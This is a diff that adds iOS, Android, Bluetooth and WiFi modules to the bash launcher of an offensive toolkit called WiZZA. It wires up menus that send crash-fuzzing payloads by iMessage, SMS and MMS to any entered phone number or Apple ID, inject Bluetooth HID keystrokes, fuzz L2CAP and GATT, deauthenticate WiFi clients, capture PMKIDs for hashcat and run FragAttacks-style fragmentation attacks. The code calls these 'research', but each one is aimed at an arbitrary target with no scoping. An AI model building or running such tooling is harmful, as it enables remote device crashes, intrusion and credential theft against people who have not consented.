@@ -9285,6 +9285,523 @@ except KeyboardInterrupt:
 PYEOF
 }
 
+# ══════════════════════════════════════════════════════════════════════════════
+# iOS Crash Research
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_ios() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/ios_crash_research.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |         WiZZA -- iOS Crash Research Module                |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} Generate fuzzing corpus  (27 parser/deserialiser payloads)"
+            echo -e "  ${W}[2]${N} Send iMessage payload    (via AppleScript / imagent)"
+            echo -e "  ${W}[3]${N} Send SMS payload         (via gammu / AT commands)"
+            echo -e "  ${W}[4]${N} Send MMS payload         (via mmsd)"
+            echo -e "  ${W}[5]${N} Harvest crash logs       (libimobiledevice idevicecrashreport)"
+            echo -e "  ${W}[6]${N} Continuous monitor       (loop backup sync, detect new crashes)"
+            echo -e "  ${W}[7]${N} Full research run        (corpus + send + harvest)"
+            echo ""
+            read -rp "  Select [1-7]: " sel
+            case "$sel" in
+                1) cmd_ios corpus ;;
+                2) cmd_ios send_imsg ;;
+                3) cmd_ios send_sms ;;
+                4) cmd_ios send_mms ;;
+                5) cmd_ios crashes ;;
+                6) cmd_ios monitor ;;
+                7) cmd_ios full ;;
+            esac
+            ;;
+        corpus)
+            read -rp "  Output dir [/tmp/wizza_ios_corpus]: " OUTD
+            OUTD="${OUTD:-/tmp/wizza_ios_corpus}"
+            echo -e "${Y}[*] Generating iOS fuzzing corpus → $OUTD${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import gen_fuzzing_corpus
+import json; print(json.dumps(gen_fuzzing_corpus('$OUTD'), indent=2, default=str))
+"
+            ;;
+        send_imsg)
+            read -rp "  Target Apple ID / phone number: " TARGET
+            [ -z "$TARGET" ] && { err "Target required"; return; }
+            read -rp "  Payload file (blank = use first corpus payload): " PFILE
+            read -rp "  Payload type [jpeg|plist|vcard|ical|pdf|gif]: " PTYPE
+            PTYPE="${PTYPE:-jpeg}"
+            if [ -z "$PFILE" ]; then
+                echo -e "${Y}[*] Generating corpus first...${N}"
+                PFILE=$(python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import gen_fuzzing_corpus
+import json, os
+r = gen_fuzzing_corpus('/tmp/wizza_ios_corpus')
+files = r.get('files', [])
+for f in files:
+    if '$PTYPE' in f:
+        print(f); break
+else:
+    print(files[0] if files else '')
+" 2>/dev/null)
+            fi
+            [ -z "$PFILE" ] && { err "No payload file"; return; }
+            echo -e "${Y}[*] Sending iMessage payload to $TARGET${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import send_imessage_payload
+import json; print(json.dumps(send_imessage_payload('$TARGET','$PFILE'), indent=2, default=str))
+"
+            ;;
+        send_sms)
+            read -rp "  Target phone number (+XXXXXXXXXXXX): " TARGET
+            [ -z "$TARGET" ] && { err "Target required"; return; }
+            read -rp "  Message text: " MSG
+            [ -z "$MSG" ] && MSG="Test"
+            echo -e "${Y}[*] Sending SMS to $TARGET${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import send_sms_payload
+import json; print(json.dumps(send_sms_payload('$TARGET','$MSG'), indent=2, default=str))
+"
+            ;;
+        send_mms)
+            read -rp "  Target phone number (+XXXXXXXXXXXX): " TARGET
+            [ -z "$TARGET" ] && { err "Target required"; return; }
+            read -rp "  Payload file: " PFILE
+            [ -z "$PFILE" ] && { err "Payload file required"; return; }
+            echo -e "${Y}[*] Sending MMS to $TARGET${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import send_mms_payload
+import json; print(json.dumps(send_mms_payload('$TARGET','$PFILE'), indent=2, default=str))
+"
+            ;;
+        crashes)
+            read -rp "  Device UDID (blank = auto-detect): " UDID
+            read -rp "  Output dir [/tmp/wizza_ios_crashes]: " OUTD
+            OUTD="${OUTD:-/tmp/wizza_ios_crashes}"
+            echo -e "${Y}[*] Harvesting crash logs${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import harvest_ios_crashes
+import json; print(json.dumps(harvest_ios_crashes('${UDID:-None}','$OUTD'), indent=2, default=str))
+" 2>&1 | sed "s/'None'/None/"
+            ;;
+        monitor)
+            read -rp "  Crash dir [/tmp/wizza_ios_crashes]: " CDIR
+            CDIR="${CDIR:-/tmp/wizza_ios_crashes}"
+            read -rp "  Interval seconds [30]: " IV; IV="${IV:-30}"
+            read -rp "  Duration seconds [600]: " DUR; DUR="${DUR:-600}"
+            echo -e "${Y}[*] Monitoring for new iOS crashes (${DUR}s, Ctrl+C to stop)${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import monitor_via_backup
+import json; print(json.dumps(monitor_via_backup(int('$IV'),int('$DUR'),'$CDIR'), indent=2, default=str))
+"
+            ;;
+        full)
+            read -rp "  Target Apple ID / phone: " TARGET
+            [ -z "$TARGET" ] && { err "Target required"; return; }
+            read -rp "  Device UDID (blank = auto): " UDID
+            echo -e "${Y}[*] Full iOS research run against $TARGET${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from ios_crash_research import full_ios_research
+import json; print(json.dumps(full_ios_research('$TARGET','${UDID:-None}'), indent=2, default=str))
+" 2>&1 | sed "s/'None'/None/"
+            ;;
+        *)
+            echo "Usage: start ios [corpus|send_imsg|send_sms|send_mms|crashes|monitor|full]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Android Surface Research
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_android() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/android_surface.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |        WiZZA -- Android Surface Research Module           |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} Check device        (ADB connection, root, Frida)"
+            echo -e "  ${W}[2]${N} Deploy Frida server  (push + start via KernelSU)"
+            echo -e "  ${W}[3]${N} Generate Frida hooks (SMS/MMS/BT/Media/Binder)"
+            echo -e "  ${W}[4]${N} Fuzz SMS             (10 payload types via ADB)"
+            echo -e "  ${W}[5]${N} Fuzz MMS PDU         (overflow/negative/recursive)"
+            echo -e "  ${W}[6]${N} Fuzz intents         (component intent fuzzer)"
+            echo -e "  ${W}[7]${N} Monitor crashes      (logcat SIGSEGV/SIGABRT watch)"
+            echo -e "  ${W}[8]${N} Full research run    (deploy + hooks + fuzz + monitor)"
+            echo ""
+            read -rp "  Select [1-8]: " sel
+            case "$sel" in
+                1) cmd_android check ;;
+                2) cmd_android deploy ;;
+                3) cmd_android hooks ;;
+                4) cmd_android fuzz_sms ;;
+                5) cmd_android fuzz_mms ;;
+                6) cmd_android fuzz_intents ;;
+                7) cmd_android monitor ;;
+                8) cmd_android full ;;
+            esac
+            ;;
+        check)
+            read -rp "  Device serial (blank = auto): " SERIAL
+            echo -e "${Y}[*] Checking Android device${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import check_device
+import json; print(json.dumps(check_device(${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+"
+            ;;
+        deploy)
+            read -rp "  Device serial (blank = auto): " SERIAL
+            read -rp "  Architecture [arm64]: " ARCH; ARCH="${ARCH:-arm64}"
+            echo -e "${Y}[*] Deploying Frida server${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import deploy_frida_server
+import json; print(json.dumps(deploy_frida_server('$ARCH',${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+"
+            ;;
+        hooks)
+            read -rp "  Hook target [all|sms|mms|bluetooth|media|binder]: " TARGET
+            TARGET="${TARGET:-all}"
+            read -rp "  Output file [/tmp/wizza_android_hooks.js]: " OUTF
+            OUTF="${OUTF:-/tmp/wizza_android_hooks.js}"
+            echo -e "${Y}[*] Generating Frida hooks ($TARGET) → $OUTF${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import frida_hooks
+r = frida_hooks('$TARGET')
+import json; print(json.dumps(r, indent=2, default=str))
+open('$OUTF','w').write(r.get('script',''))
+print('Script written to $OUTF')
+"
+            ;;
+        fuzz_sms)
+            read -rp "  Target phone number: " TARGET
+            [ -z "$TARGET" ] && { err "Phone number required"; return; }
+            read -rp "  Payload count [50]: " CNT; CNT="${CNT:-50}"
+            read -rp "  Device serial (blank = auto): " SERIAL
+            echo -e "${Y}[*] Fuzzing SMS handlers on $TARGET${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import fuzz_sms
+import json; print(json.dumps(fuzz_sms('$TARGET',int('$CNT'),${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+"
+            ;;
+        fuzz_mms)
+            read -rp "  Device serial (blank = auto): " SERIAL
+            read -rp "  Payload count [20]: " CNT; CNT="${CNT:-20}"
+            echo -e "${Y}[*] Fuzzing MMS PDU parser${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import fuzz_mms
+import json; print(json.dumps(fuzz_mms(${SERIAL:+\"'$SERIAL'\"},int('$CNT')), indent=2, default=str))
+"
+            ;;
+        fuzz_intents)
+            read -rp "  Target package [com.android.mms]: " PKG
+            PKG="${PKG:-com.android.mms}"
+            read -rp "  Device serial (blank = auto): " SERIAL
+            echo -e "${Y}[*] Fuzzing intents for $PKG${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import fuzz_intents
+import json; print(json.dumps(fuzz_intents('$PKG',${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+"
+            ;;
+        monitor)
+            read -rp "  Duration seconds [120]: " DUR; DUR="${DUR:-120}"
+            read -rp "  Device serial (blank = auto): " SERIAL
+            echo -e "${Y}[*] Monitoring Android crash log (${DUR}s, Ctrl+C to stop)${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import monitor_crashes
+import json; print(json.dumps(monitor_crashes(int('$DUR'),${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+"
+            ;;
+        full)
+            read -rp "  Target phone number (blank = skip SMS/MMS): " TARGET
+            read -rp "  Device serial (blank = auto): " SERIAL
+            echo -e "${Y}[*] Full Android research run${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from android_surface import full_android_research
+import json; print(json.dumps(full_android_research('${TARGET:-}',${SERIAL:+\"'$SERIAL'\"}), indent=2, default=str))
+"
+            ;;
+        *)
+            echo "Usage: start android [check|deploy|hooks|fuzz_sms|fuzz_mms|fuzz_intents|monitor|full]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Bluetooth Probe
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_bluetooth() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/bluetooth_probe.py"
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |           WiZZA -- Bluetooth Probe Module                 |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${W}[1]${N} Scan Classic BT     (nearby devices, name/class)"
+            echo -e "  ${W}[2]${N} Scan BLE             (advertisement data)"
+            echo -e "  ${W}[3]${N} L2CAP fuzz           (malformed frames → target)"
+            echo -e "  ${W}[4]${N} BLE advertisement fuzz (malformed AD structures)"
+            echo -e "  ${W}[5]${N} HID inject           (L2CAP PSM 0x0013 HID reports)"
+            echo -e "  ${W}[6]${N} GATT fuzz            (characteristic R/W fuzzer)"
+            echo -e "  ${W}[7]${N} HCI raw fuzz         (raw HCI commands — needs root)"
+            echo -e "  ${W}[8]${N} Full probe           (scan + L2CAP + BLE + GATT)"
+            echo ""
+            read -rp "  Select [1-8]: " sel
+            case "$sel" in
+                1) cmd_bluetooth scan ;;
+                2) cmd_bluetooth blescan ;;
+                3) cmd_bluetooth l2cap ;;
+                4) cmd_bluetooth bleadv ;;
+                5) cmd_bluetooth hid ;;
+                6) cmd_bluetooth gatt ;;
+                7) cmd_bluetooth hci ;;
+                8) cmd_bluetooth full ;;
+            esac
+            ;;
+        scan)
+            read -rp "  Scan duration seconds [10]: " DUR; DUR="${DUR:-10}"
+            echo -e "${Y}[*] Scanning for Classic Bluetooth devices${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import bt_scan
+import json; print(json.dumps(bt_scan(int('$DUR')), indent=2, default=str))
+"
+            ;;
+        blescan)
+            read -rp "  Scan duration seconds [10]: " DUR; DUR="${DUR:-10}"
+            echo -e "${Y}[*] Scanning for BLE devices${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import ble_scan
+import json; print(json.dumps(ble_scan(int('$DUR')), indent=2, default=str))
+"
+            ;;
+        l2cap)
+            read -rp "  Target Bluetooth address (AA:BB:CC:DD:EE:FF): " ADDR
+            [ -z "$ADDR" ] && { err "Target address required"; return; }
+            read -rp "  L2CAP port [1]: " PORT; PORT="${PORT:-1}"
+            read -rp "  Payload count [100]: " CNT; CNT="${CNT:-100}"
+            echo -e "${Y}[*] L2CAP fuzzing → $ADDR${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import l2cap_fuzz
+import json; print(json.dumps(l2cap_fuzz('$ADDR',int('$PORT'),int('$CNT')), indent=2, default=str))
+"
+            ;;
+        bleadv)
+            read -rp "  Payload count [200]: " CNT; CNT="${CNT:-200}"
+            read -rp "  HCI device [hci0]: " HDEV; HDEV="${HDEV:-hci0}"
+            echo -e "${Y}[*] BLE advertisement fuzzing via $HDEV${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import ble_adv_fuzz
+import json; print(json.dumps(ble_adv_fuzz(int('$CNT'),'$HDEV'), indent=2, default=str))
+"
+            ;;
+        hid)
+            read -rp "  Target Bluetooth address: " ADDR
+            [ -z "$ADDR" ] && { err "Target address required"; return; }
+            echo -e "${Y}[*] HID injection → $ADDR${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import hid_inject
+import json; print(json.dumps(hid_inject('$ADDR'), indent=2, default=str))
+"
+            ;;
+        gatt)
+            read -rp "  Target BLE address: " ADDR
+            [ -z "$ADDR" ] && { err "Target address required"; return; }
+            echo -e "${Y}[*] GATT characteristic fuzzing → $ADDR${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import gatt_fuzz
+import json; print(json.dumps(gatt_fuzz('$ADDR'), indent=2, default=str))
+"
+            ;;
+        hci)
+            check_root
+            read -rp "  HCI device [hci0]: " HDEV; HDEV="${HDEV:-hci0}"
+            read -rp "  Command count [50]: " CNT; CNT="${CNT:-50}"
+            echo -e "${Y}[*] Raw HCI command injection via $HDEV (needs CAP_NET_ADMIN)${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import hci_raw_fuzz
+import json; print(json.dumps(hci_raw_fuzz('$HDEV',int('$CNT')), indent=2, default=str))
+"
+            ;;
+        full)
+            read -rp "  Target address (blank = scan first): " ADDR
+            read -rp "  HCI device [hci0]: " HDEV; HDEV="${HDEV:-hci0}"
+            read -rp "  Scan duration [10]: " DUR; DUR="${DUR:-10}"
+            echo -e "${Y}[*] Full Bluetooth probe${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from bluetooth_probe import full_bt_probe
+import json; print(json.dumps(full_bt_probe('${ADDR:-None}','$HDEV',int('$DUR')), indent=2, default=str))
+" 2>&1 | sed "s/'None'/None/"
+            ;;
+        *)
+            echo "Usage: start bluetooth [scan|blescan|l2cap|bleadv|hid|gatt|hci|full]"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# WiFi 802.11 Probe (frame injection / fragmentation / PMKID)
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_wifiprobe() {
+    local ACTION="${1:-menu}"
+    local MOD="$DIR/op/modules/wifi_probe.py"
+
+    # Detect wireless interface
+    local IFACE="${2:-}"
+    if [ -z "$IFACE" ]; then
+        IFACE=$(iwconfig 2>/dev/null | grep 'IEEE' | awk '{print $1}' | head -1)
+        [ -z "$IFACE" ] && IFACE="wlan0"
+    fi
+
+    case "$ACTION" in
+        menu|"")
+            clear
+            echo -e "${C}"
+            echo "  +----------------------------------------------------------+"
+            echo "  |        WiZZA -- WiFi 802.11 Probe Module                  |"
+            echo "  +----------------------------------------------------------+"
+            echo -e "${N}"
+            echo -e "  ${Y}Detected interface: ${C}$IFACE${N}"
+            echo ""
+            echo -e "  ${W}[1]${N} List interfaces      (all wireless interfaces)"
+            echo -e "  ${W}[2]${N} Enable monitor mode  (airmon-ng / iw fallback)"
+            echo -e "  ${W}[3]${N} Beacon fuzz          (8 malformed beacon variants)"
+            echo -e "  ${W}[4]${N} Deauth PMF test      (802.11w management frame test)"
+            echo -e "  ${W}[5]${N} PMKID capture        (hcxdumptool → hashcat)"
+            echo -e "  ${W}[6]${N} Fragmentation attack (FragAttacks CVE-2020-24588 class)"
+            echo -e "  ${W}[7]${N} Full probe           (all tests against target AP)"
+            echo ""
+            read -rp "  Select [1-7]: " sel
+            case "$sel" in
+                1) cmd_wifiprobe ifaces ;;
+                2) cmd_wifiprobe monitor "$IFACE" ;;
+                3) cmd_wifiprobe beacon "$IFACE" ;;
+                4) cmd_wifiprobe deauth "$IFACE" ;;
+                5) cmd_wifiprobe pmkid "$IFACE" ;;
+                6) cmd_wifiprobe frag "$IFACE" ;;
+                7) cmd_wifiprobe full "$IFACE" ;;
+            esac
+            ;;
+        ifaces)
+            echo -e "${Y}[*] Wireless interfaces${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_probe import get_wireless_interfaces
+import json; print(json.dumps(get_wireless_interfaces(), indent=2, default=str))
+"
+            ;;
+        monitor)
+            check_root
+            echo -e "${Y}[*] Enabling monitor mode on $IFACE${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_probe import enable_monitor_mode
+import json; print(json.dumps(enable_monitor_mode('$IFACE'), indent=2, default=str))
+"
+            ;;
+        beacon)
+            check_root
+            read -rp "  Target BSSID to fuzz (blank = broadcast): " BSSID
+            read -rp "  Payload count [50]: " CNT; CNT="${CNT:-50}"
+            echo -e "${Y}[*] 802.11 beacon fuzzing via $IFACE${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_probe import beacon_fuzz
+import json; print(json.dumps(beacon_fuzz('$IFACE','${BSSID:-None}',int('$CNT')), indent=2, default=str))
+" 2>&1 | sed "s/'None'/None/"
+            ;;
+        deauth)
+            check_root
+            read -rp "  Target BSSID (AA:BB:CC:DD:EE:FF): " BSSID
+            [ -z "$BSSID" ] && { err "BSSID required"; return; }
+            read -rp "  Client MAC (blank = broadcast): " CLIENT
+            CLIENT="${CLIENT:-broadcast}"
+            read -rp "  Frame count [50]: " CNT; CNT="${CNT:-50}"
+            echo -e "${Y}[*] Deauth/PMF test → $BSSID${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_probe import deauth_test
+import json; print(json.dumps(deauth_test('$IFACE','$BSSID','$CLIENT',int('$CNT')), indent=2, default=str))
+"
+            ;;
+        pmkid)
+            check_root
+            read -rp "  Target BSSID (blank = all): " BSSID
+            read -rp "  Capture duration seconds [60]: " DUR; DUR="${DUR:-60}"
+            read -rp "  Output dir [/tmp/wizza_pmkid]: " OUTD; OUTD="${OUTD:-/tmp/wizza_pmkid}"
+            echo -e "${Y}[*] PMKID capture via $IFACE${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_probe import pmkid_capture
+import json; print(json.dumps(pmkid_capture('$IFACE','${BSSID:-None}',int('$DUR'),'$OUTD'), indent=2, default=str))
+" 2>&1 | sed "s/'None'/None/"
+            ;;
+        frag)
+            check_root
+            read -rp "  Target BSSID: " BSSID
+            [ -z "$BSSID" ] && { err "BSSID required"; return; }
+            read -rp "  Client MAC: " CLIENT
+            [ -z "$CLIENT" ] && { err "Client MAC required"; return; }
+            echo -e "${Y}[*] Fragmentation attack research → $BSSID${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_probe import fragmentation_research
+import json; print(json.dumps(fragmentation_research('$IFACE','$BSSID','$CLIENT'), indent=2, default=str))
+"
+            ;;
+        full)
+            check_root
+            read -rp "  Target BSSID (blank = scan): " BSSID
+            read -rp "  Run duration seconds [120]: " DUR; DUR="${DUR:-120}"
+            echo -e "${Y}[*] Full WiFi probe via $IFACE${N}"
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
+from wifi_probe import full_wifi_probe
+import json; print(json.dumps(full_wifi_probe('$IFACE','${BSSID:-None}',int('$DUR')), indent=2, default=str))
+" 2>&1 | sed "s/'None'/None/"
+            ;;
+        *)
+            echo "Usage: start wifiprobe [ifaces|monitor|beacon|deauth|pmkid|frag|full] [iface]"
+            ;;
+    esac
+}
+
 # ── Entry point — dispatch command or run wizard ─────────────
 CMD="${1:-}"
 # Auto-install shortcuts if not already on PATH (first run on new machine)
@@ -9335,6 +9852,10 @@ case "$CMD" in
     adchain)        init_files; cmd_adchain "$2" "$3" "$4" "$5" ;;
     uefi)           init_files; cmd_uefi "$2" "$3" "$4" "$5" ;;
     baseband)       init_files; cmd_baseband "$2" "$3" "$4" "$5" ;;
+    ios)            init_files; cmd_ios      "$2" "$3" "$4" "$5" ;;
+    android)        init_files; cmd_android  "$2" "$3" "$4" "$5" ;;
+    bluetooth)      init_files; cmd_bluetooth "$2" "$3" "$4" "$5" ;;
+    wifiprobe)      init_files; cmd_wifiprobe "$2" "$3" "$4" "$5" ;;
     physical)
         # sudo re-exec entry point: start physical <victim_ip> <target_domain>
         VICTIM_IP="$2"; TARGET_DOMAIN="$3"
